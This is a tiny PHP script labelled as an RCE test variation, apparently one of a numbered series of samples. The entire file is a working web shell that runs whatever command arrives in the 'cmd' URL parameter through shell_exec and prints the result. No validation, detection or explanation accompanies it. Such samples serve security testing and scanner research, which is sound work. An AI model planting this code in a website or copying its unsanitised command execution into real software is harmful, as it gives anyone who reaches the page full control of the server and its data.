<?php
// RCE test variation #511
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>